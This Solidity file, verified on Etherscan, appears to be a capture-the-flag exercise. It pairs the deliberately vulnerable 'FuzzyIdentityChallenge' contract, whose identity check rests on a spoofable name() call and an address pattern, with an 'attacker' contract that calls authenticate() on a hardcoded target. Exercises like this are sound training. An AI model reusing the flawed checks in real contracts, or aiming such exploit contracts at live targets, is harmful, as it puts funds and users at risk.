/**
 *Submitted for verification at Etherscan.io on 2022-02-07
*/

pragma solidity ^0.4.21;

interface IName {
    function name() external view returns (bytes32);
}

contract FuzzyIdentityChallenge {
    bool public isComplete;

    function authenticate() public {
        require(isSmarx(msg.sender));
        require(isBadCode(msg.sender));

        isComplete = true;
    }

    function isSmarx(address addr) internal view returns (bool) {
        return IName(addr).name() == bytes32("smarx");
    }

    function isBadCode(address _addr) internal pure returns (bool) {
        bytes20 addr = bytes20(_addr);
        bytes20 id = hex"000000000000000000000000000000000badc0de";
        bytes20 mask = hex"000000000000000000000000000000000fffffff";

        for (uint256 i = 0; i < 34; i++) {
            if (addr & mask == id) {
                return true;
            }
            mask <<= 4;
            id <<= 4;
        }

        return false;
    }
}

contract attacker{
    address public target = 0x5262308FF7f05B9A26F4cc9bD55A97689041ac01;
    bytes32 public answer = bytes32("smarx");

    function name()external view returns(bytes32){
        return answer;
    }

    function updateTarget(address _address) public{
        target = _address;
    }

    function updateAnswer(bytes32 _answer)public{
        answer = _answer;
    }

    function attack()public{
        FuzzyIdentityChallenge targetA = FuzzyIdentityChallenge(target);
        targetA.authenticate();
    }

}